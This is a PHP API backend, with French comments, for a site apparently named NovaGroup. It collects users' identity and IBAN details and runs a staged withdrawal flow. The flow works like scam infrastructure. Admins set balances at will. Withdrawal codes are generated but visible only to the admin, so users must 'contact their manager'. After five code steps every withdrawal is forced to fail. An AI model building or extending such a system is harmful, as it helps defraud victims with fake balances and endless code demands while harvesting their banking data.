<?php
// ============================================================
//  NOVAGROUP — API REST (api/api.php)
//  Tous les appels AJAX passent ici
// ============================================================
require_once __DIR__ . '/../includes/config.php';

header('Content-Type: application/json');
startSession();

$action = $_POST['action'] ?? $_GET['action'] ?? '';

switch ($action) {

    // ──────────────────────────────────────────────
    case 'register':
        $fn      = trim($_POST['first_name'] ?? '');
        $ln      = trim($_POST['last_name']  ?? '');
        $dob     = trim($_POST['dob']        ?? '');
        $email   = trim($_POST['email']      ?? '');
        $pw      = $_POST['password']        ?? '';
        $phone   = trim($_POST['phone']      ?? '');
        $country = trim($_POST['country']    ?? '');
        $iban    = trim($_POST['iban']        ?? '');
        $bank    = trim($_POST['bank_name']  ?? '');

        if (!$fn || !$ln || !$dob || !$email || !$pw || !$phone || !$country || !$iban || !$bank)
            jsonResponse(['error' => 'Veuillez remplir tous les champs obligatoires.'], 400);
        if (strlen($pw) < 6)
            jsonResponse(['error' => 'Mot de passe trop court (6 caractères minimum).'], 400);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL))
            jsonResponse(['error' => 'Adresse e-mail invalide.'], 400);

        // Vérifier âge >= 18
        $dobDate = DateTime::createFromFormat('Y-m-d', $dob);
        if (!$dobDate || (new DateTime())->diff($dobDate)->y < 18)
            jsonResponse(['error' => 'Vous devez avoir au moins 18 ans.'], 400);

        $currency = COUNTRY_CURRENCY[$country] ?? 'EUR';
        $hash     = password_hash($pw, PASSWORD_BCRYPT);

        try {
            $stmt = db()->prepare(
                'INSERT INTO users (first_name,last_name,dob,email,password,phone,country,iban,bank_name,currency,balance)
                 VALUES (?,?,?,?,?,?,?,?,?,?,0)'
            );
            $stmt->execute([$fn, $ln, $dob, $email, $hash, $phone, $country, $iban, $bank, $currency]);
            jsonResponse(['success' => true, 'message' => 'Compte créé avec succès ! Connectez-vous.']);
        } catch (PDOException $e) {
            if ($e->getCode() === '23000')
                jsonResponse(['error' => 'Cet e-mail est déjà utilisé.'], 409);
            jsonResponse(['error' => 'Erreur serveur.'], 500);
        }

    // ──────────────────────────────────────────────
    case 'login':
        $email = trim($_POST['email'] ?? '');
        $pw    = $_POST['password']   ?? '';

        if (!$email || !$pw)
            jsonResponse(['error' => 'Remplissez tous les champs.'], 400);

        $stmt = db()->prepare('SELECT * FROM users WHERE email = ?');
        $stmt->execute([$email]);
        $user = $stmt->fetch();

        if (!$user || !password_verify($pw, $user['password']))
            jsonResponse(['error' => 'Identifiants incorrects.'], 401);

        $_SESSION['user_id']  = $user['id'];
        $_SESSION['is_admin'] = (bool)$user['is_admin'];

        jsonResponse([
            'success'  => true,
            'is_admin' => (bool)$user['is_admin'],
            'name'     => $user['first_name'],
            'redirect' => $user['is_admin'] ? '?page=admin' : '?page=dashboard',
        ]);

    // ──────────────────────────────────────────────
    case 'logout':
        session_destroy();
        jsonResponse(['success' => true]);

    // ──────────────────────────────────────────────
    case 'get_dashboard':
        $u = currentUser();
        if (!$u) jsonResponse(['error' => 'Non connecté.'], 401);

        // Retrait en cours ?
        $pendingStmt = db()->prepare(
            "SELECT * FROM withdrawals WHERE user_id = ? AND status = 'pending' ORDER BY id DESC LIMIT 1"
        );
        $pendingStmt->execute([$u['id']]);
        $pending = $pendingStmt->fetch() ?: null;

        jsonResponse([
            'success' => true,
            'user'    => [
                'id'        => $u['id'],
                'firstName' => $u['first_name'],
                'lastName'  => $u['last_name'],
                'email'     => $u['email'],
                'phone'     => $u['phone'],
                'dob'       => $u['dob'],
                'country'   => $u['country'],
                'iban'      => $u['iban'],
                'bank'      => $u['bank_name'],
                'currency'  => $u['currency'],
                'balance'   => (float)$u['balance'],
                'createdAt' => $u['created_at'],
            ],
            'pending' => $pending ? [
                'id'            => $pending['id'],
                'amount'        => (float)$pending['amount'],
                'currency'      => $pending['currency'],
                'step'          => (int)$pending['step'],
                'currentPct'    => (int)$pending['current_pct'],
                'targetPct'     => (int)$pending['target_pct'],
                'codeRequested' => (bool)$pending['code_requested'],
            ] : null,
        ]);

    // ──────────────────────────────────────────────
    case 'initiate_withdrawal':
        $u   = currentUser();
        if (!$u) jsonResponse(['error' => 'Non connecté.'], 401);

        $amt  = (float)($_POST['amount'] ?? 0);
        $fn   = trim($_POST['ben_firstname'] ?? '');
        $ln   = trim($_POST['ben_lastname']  ?? '');
        $bank = trim($_POST['ben_bank']      ?? '');
        $iban = trim($_POST['ben_iban']      ?? '');
        $bic  = trim($_POST['ben_bic']       ?? '');
        $ph   = trim($_POST['ben_phone']     ?? '');
        $rsn  = trim($_POST['ben_reason']    ?? '');

        if ($amt <= 0) jsonResponse(['error' => 'Montant invalide.'], 400);
        if ($amt > (float)$u['balance']) jsonResponse(['error' => 'Solde insuffisant.'], 400);
        if (!$fn || !$ln || !$bank || !$iban || !$bic || !$ph)
            jsonResponse(['error' => 'Tous les champs bancaires sont obligatoires.'], 400);

        // Annuler tout retrait précédent en attente
        db()->prepare("UPDATE withdrawals SET status='cancelled' WHERE user_id=? AND status='pending'")
             ->execute([$u['id']]);

        $stmt = db()->prepare(
            'INSERT INTO withdrawals
             (user_id,amount,currency,step,current_pct,target_pct,code_requested,status,
              ben_firstname,ben_lastname,ben_bank,ben_iban,ben_bic,ben_phone,ben_reason)
             VALUES (?,?,?,0,0,20,0,"pending",?,?,?,?,?,?,?)'
        );
        $stmt->execute([$u['id'], $amt, $u['currency'], $fn, $ln, $bank, $iban, $bic, $ph, $rsn]);
        $wdId = db()->lastInsertId();

        jsonResponse(['success' => true, 'withdrawal_id' => $wdId]);

    // ──────────────────────────────────────────────
    case 'request_code':
        $u    = currentUser();
        if (!$u) jsonResponse(['error' => 'Non connecté.'], 401);

        $wdId = (int)($_POST['withdrawal_id'] ?? 0);
        $stmt = db()->prepare("SELECT * FROM withdrawals WHERE id=? AND user_id=? AND status='pending'");
        $stmt->execute([$wdId, $u['id']]);
        $wd = $stmt->fetch();
        if (!$wd) jsonResponse(['error' => 'Retrait introuvable.'], 404);

        $code = str_pad(random_int(100000, 999999), 6, '0', STR_PAD_LEFT);
        $step = (int)$wd['step'] + 1;

        db()->prepare(
            'INSERT INTO withdrawal_codes (withdrawal_id,user_id,code,step) VALUES (?,?,?,?)'
        )->execute([$wdId, $u['id'], $code, $step]);

        db()->prepare("UPDATE withdrawals SET code_requested=1 WHERE id=?")
            ->execute([$wdId]);

        jsonResponse(['success' => true, 'code_sent' => true]);

    // ──────────────────────────────────────────────
    case 'validate_code':
        $u      = currentUser();
        if (!$u) jsonResponse(['error' => 'Non connecté.'], 401);

        $wdId   = (int)($_POST['withdrawal_id'] ?? 0);
        $entered = trim($_POST['code'] ?? '');

        $wdStmt = db()->prepare("SELECT * FROM withdrawals WHERE id=? AND user_id=? AND status='pending'");
        $wdStmt->execute([$wdId, $u['id']]);
        $wd = $wdStmt->fetch();
        if (!$wd) jsonResponse(['error' => 'Retrait introuvable.'], 404);

        // Trouver le dernier code non utilisé
        $cStmt = db()->prepare(
            "SELECT * FROM withdrawal_codes WHERE withdrawal_id=? AND used=0 ORDER BY id DESC LIMIT 1"
        );
        $cStmt->execute([$wdId]);
        $cRow = $cStmt->fetch();

        if (!$cRow || $cRow['code'] !== $entered)
            jsonResponse(['error' => 'Code incorrect. Contactez votre gestionnaire.'], 400);

        // Marquer le code comme utilisé
        db()->prepare("UPDATE withdrawal_codes SET used=1 WHERE id=?")->execute([$cRow['id']]);

        $newStep = (int)$wd['step'] + 1;

        if ($newStep >= 5) {
            // Retrait échoué (comportement original : afficher l'écran d'échec)
            db()->prepare("UPDATE withdrawals SET step=5, current_pct=100, status='failed', code_requested=0 WHERE id=?")
                ->execute([$wdId]);
            jsonResponse(['success' => true, 'finished' => true, 'failed' => true]);
        } else {
            $newPct    = $newStep * 20;
            $targetPct = ($newStep + 1) * 20;
            db()->prepare(
                "UPDATE withdrawals SET step=?, current_pct=?, target_pct=?, code_requested=0 WHERE id=?"
            )->execute([$newStep, $newPct, $targetPct, $wdId]);

            jsonResponse([
                'success'   => true,
                'finished'  => false,
                'newStep'   => $newStep,
                'newPct'    => $newPct,
                'targetPct' => $targetPct,
            ]);
        }

    // ──────────────────────────────────────────────
    case 'save_withdrawal_progress':
        $u    = currentUser();
        if (!$u) jsonResponse(['error' => 'Non connecté.'], 401);
        $wdId = (int)($_POST['withdrawal_id'] ?? 0);
        db()->prepare("SELECT id FROM withdrawals WHERE id=? AND user_id=? AND status='pending'")->execute([$wdId, $u['id']]);
        jsonResponse(['success' => true]);

    // ──────────────────────────────────────────────
    case 'cancel_withdrawal':
        $u    = currentUser();
        if (!$u) jsonResponse(['error' => 'Non connecté.'], 401);
        $wdId = (int)($_POST['withdrawal_id'] ?? 0);
        db()->prepare("UPDATE withdrawals SET status='cancelled' WHERE id=? AND user_id=? AND status='pending'")
            ->execute([$wdId, $u['id']]);
        jsonResponse(['success' => true]);

    // ──────────────────────────────────────────────
    //  ADMIN ENDPOINTS
    // ──────────────────────────────────────────────
    case 'admin_get_users':
        requireAdmin();
        $rows = db()->query(
            "SELECT id,first_name,last_name,email,dob,country,currency,balance,is_admin,created_at FROM users ORDER BY id DESC"
        )->fetchAll();
        $total = array_sum(array_column($rows, 'balance'));
        $pending = db()->query("SELECT COUNT(*) FROM withdrawals WHERE status='pending'")->fetchColumn();
        jsonResponse(['success' => true, 'users' => $rows, 'total_balance' => $total, 'pending_withdrawals' => $pending]);

    // ──────────────────────────────────────────────
    case 'admin_get_codes':
        requireAdmin();
        $codes = db()->query(
            "SELECT wc.*, u.first_name, u.last_name, u.email AS user_email,
                    w.amount, w.currency,
                    (SELECT COUNT(*)+1 FROM withdrawal_codes wc2 WHERE wc2.withdrawal_id=wc.withdrawal_id AND wc2.id < wc.id) AS step_num
             FROM withdrawal_codes wc
             JOIN users u ON u.id = wc.user_id
             JOIN withdrawals w ON w.id = wc.withdrawal_id
             WHERE wc.used = 0
             ORDER BY wc.id DESC"
        )->fetchAll();
        jsonResponse(['success' => true, 'codes' => $codes]);

    // ──────────────────────────────────────────────
    case 'admin_edit_balance':
        requireAdmin();
        $uid = (int)($_POST['user_id'] ?? 0);
        $bal = (float)($_POST['balance'] ?? -1);
        if ($uid <= 0 || $bal < 0) jsonResponse(['error' => 'Données invalides.'], 400);
        db()->prepare("UPDATE users SET balance=? WHERE id=?")->execute([$bal, $uid]);
        jsonResponse(['success' => true]);

    // ──────────────────────────────────────────────
    case 'admin_delete_user':
        requireAdmin();
        $uid = (int)($_POST['user_id'] ?? 0);
        if ($uid <= 0) jsonResponse(['error' => 'ID invalide.'], 400);
        db()->prepare("DELETE FROM users WHERE id=? AND is_admin=0")->execute([$uid]);
        jsonResponse(['success' => true]);

    // ──────────────────────────────────────────────
    default:
        jsonResponse(['error' => 'Action inconnue.'], 400);
}
